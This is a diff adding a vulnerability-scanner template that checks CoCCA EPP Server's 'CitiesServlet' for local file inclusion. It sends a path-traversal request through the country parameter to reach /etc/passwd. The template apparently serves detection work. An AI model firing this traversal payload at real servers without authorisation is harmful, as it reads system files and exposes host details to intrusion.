@@ -1,0 +1,24 @@
+id: epp-server-lfi
+brief:
+    title: EPP Server - Local File Inclusion
+    by: DhiyaneshDK
+    level: high
+    about: servlet called "CitiesServlet" that handles HTTP GET requests, so the user-provided input, obtained from the country parameter, is directly concatenated with the "/cities/cities_" string to form th...
+    label:
+        - epp
+        - cocca
+        - registry
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/cities?country=/../../../../../../../../etc/passwd'
+      signs:
+        - "on": word
+          has:
+            - application/json
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
